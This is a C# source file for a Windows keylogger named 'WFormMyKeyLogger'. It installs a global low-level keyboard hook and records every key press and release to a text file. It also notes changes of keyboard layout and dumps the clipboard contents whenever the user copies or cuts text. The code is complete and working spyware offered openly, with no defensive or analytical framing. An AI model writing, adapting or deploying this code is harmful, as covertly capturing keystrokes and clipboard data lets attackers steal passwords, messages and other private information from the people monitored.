using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WFormMyKeyLogger
{   
    class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100; // pressed
        private const int WM_KEYUP = 0x0101; // released

        private static string notepadPath = null;
        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static string mss = null;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        public static void Start(string _notepadPath)
        {
            notepadPath = _notepadPath;
            if (!File.Exists(notepadPath))
            {
                using (File.Create(notepadPath)) { }
            }
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var keyName = Enum.GetName(typeof(Keys), vkCode);
                KeysConverter keysConverter = new KeysConverter();
                using (StreamWriter sw = new StreamWriter(notepadPath, true))
                {
                    KeysConverter kc = new KeysConverter();
                    string mystring = kc.ConvertToString((Keys)vkCode);
                    string original = mystring;

                    // Request keyboard layout for each character

                    ushort lang_check = GetKeyboardLayout();
                    string mss_check = lang_check.ToString();

                    if (mss == mss_check) { }
                    else
                    {
                        sw.WriteLine("Change keyboard layout:" + mss_check + " > ", "Key");
                        mss = mss_check;
                    }

                    if (wParam == (IntPtr)WM_KEYDOWN)   //write all the keys in a row
                    {
                        sw.Write(original + " ", "Key");
                    }

                    if (wParam == (IntPtr)WM_KEYUP) // write only those that were released (in our case, all the control)
                    {
                        if (Keys.LControlKey == (Keys)vkCode | Keys.RControlKey == (Keys)vkCode) { sw.WriteLine(original + "UP", "Key"); } // if was released = record
                        if (Keys.LShiftKey == (Keys)vkCode | Keys.RShiftKey == (Keys)vkCode) { sw.WriteLine(original + "UP", "Key"); } // if was released = record
                    }

                    // Catch the keys CTRL + C (copy to the buffer)
                    if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        string htmlData1 = GetBuff();                                      // get the buffer  
                        sw.WriteLine("Содержимое буфера: " + htmlData1, "Key");            // write buffer            
                        sw.WriteLine("<== <COPY> ", "Key");
                    }
                    else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        string htmlData1 = GetBuff();
                        sw.WriteLine("Contents of the buffer: " + htmlData1, "Key");
                        sw.WriteLine("<== <CUT> ", "Key");
                    }
                    else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        sw.WriteLine("<PASTE> ", "Key");
                    }
                    else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        sw.WriteLine("<Cancel> ", "Key");
                    }
                    else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        sw.WriteLine("<Search> ", "Key");
                    }
                    else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        sw.WriteLine("<Select all> ", "Key");
                    }
                    else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        sw.WriteLine("<New> ", "Key");
                    }
                    else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                    {
                        sw.WriteLine("<New inset> ", "Key");
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }

        //------------------------------try to find out the keyboard layout-------------------------------------------------//

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
    }
}